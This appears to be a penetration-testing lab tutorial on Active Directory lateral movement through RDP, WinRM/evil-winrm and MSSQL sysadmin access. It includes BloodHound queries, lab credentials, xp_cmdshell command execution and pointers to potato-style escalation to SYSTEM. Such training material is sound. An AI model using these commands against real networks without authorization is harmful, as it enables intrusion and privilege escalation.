# Privileged Access

Once a foothold is established in a domain, lateral movement shifts from gaining initial access to expanding reach across hosts. Three primary remote access vectors exist beyond Pass-the-Hash: RDP, WinRM/PSRemoting, and MSSQL with sysadmin rights. Each can be enumerated through [BloodHound](https://github.com/BloodHoundAD/BloodHound) edges (`CanRDP`, `CanPSRemote`, `SQLAdmin`) or PowerView.

***

## Remote Desktop Protocol (RDP)

RDP provides full GUI access to a remote host. Even without local admin rights, RDP access lets you hunt for credentials, launch further attacks, or find a local privilege escalation path.

Enumerate the `Remote Desktop Users` group on a target host:

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

Example output:

```
ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
```

Finding `Domain Users` in this group means every single domain account can RDP to that host. This is common on jump hosts and RDS servers but is a significant finding because any compromised user instantly has a foothold with GUI access. The first check after importing BloodHound data should be whether the Domain Users group has local admin or execution rights (RDP, WinRM) over any hosts.

BloodHound pre-built queries to run:

- `Find Workstations where Domain Users can RDP`
- `Find Servers where Domain Users can RDP`

Connect from Linux using [xfreerdp](https://github.com/FreeRDP/FreeRDP):

```bash
xfreerdp /v:10.129.x.x /u:forend /p:Klmcargo2
```

***

## WinRM / PSRemoting

WinRM uses port 5985 (HTTP) or 5986 (HTTPS). The `Remote Management Users` group grants WinRM access without local admin rights, making it an important group to check.

Enumerate the group on a target:

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

Example output:

```
ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
IsGroup      : False
```

BloodHound Cypher query to map all users with WinRM access via group membership:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

### Connecting from Windows

```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

You land in a remote PowerShell session:

```
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01
```

Exit with `Exit-PSSession`.

### Connecting from Linux with evil-winrm

Install:

```bash
gem install evil-winrm
```

Connect:

```bash
evil-winrm -i 10.129.201.234 -u forend
```

[evil-winrm](https://github.com/Hackplayers/evil-winrm) also supports pass-the-hash via `-H <NTLM hash>`, loading local PowerShell scripts with `-s`, and uploading compiled executables with `-e`, making it significantly more capable than a plain PSSession for offensive work.

***

## SQL Server Admin (sysadmin)

Accounts with `sysadmin` privileges on a SQL Server instance can log in remotely, run queries, and execute OS commands through `xp_cmdshell`. This is a frequent finding because service accounts running SQL Server are often over-privileged, and credentials surface through Kerberoasting, LLMNR spoofing, password spraying, or configuration files found by tools like [Snaffler](https://github.com/SnaffCon/Snaffler).

BloodHound Cypher query for SQL admin rights:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

### Enumerating SQL Instances with PowerUpSQL

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

Example output:

```
ComputerName  : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance      : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccount : damundsen
Service       : MSSQLSvc
```

Run a test query to confirm authentication:

```powershell
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

### Connecting from Linux with mssqlclient.py

```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

Once connected, type `help` to see available commands. The key ones are:

| Command | Purpose |
|---------|---------|
| `enable_xp_cmdshell` | Enables OS command execution via the database |
| `xp_cmdshell <cmd>` | Executes a shell command in the context of the SQL service account |
| `disable_xp_cmdshell` | Disables the feature after use |
| `sp_start_job <cmd>` | Executes a command via SQL Server Agent (blind execution) |

### Enabling xp_cmdshell and Running Commands

```
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```

Example output showing high-value privileges:

```
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
```

`SeImpersonatePrivilege` is particularly significant. It can be abused with tools such as [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), [RoguePotato](https://github.com/antonioCoco/RoguePotato), or [JuicyPotato](https://github.com/ohpe/juicy-potato) to escalate from the SQL service account context to `SYSTEM`, depending on the OS version. This turns an MSSQL sysadmin account into full local compromise of the database server.

***

## Privilege Discovery Workflow

When assessing privileged access paths, follow this order:

1. Import BloodHound data from SharpHound and check `Outbound Execution Rights` for any accounts you control
2. Use pre-built BloodHound queries to check for Domain Users RDP/WinRM access across all hosts
3. Run custom Cypher queries for `CanPSRemote` and `SQLAdmin` edges via group membership paths
4. Confirm with PowerView (`Get-NetLocalGroupMember`) for specific hosts of interest
5. Test WinRM from Windows with `Enter-PSSession` and from Linux with `evil-winrm`
6. Test SQL access with PowerUpSQL from Windows and `mssqlclient.py` from Linux
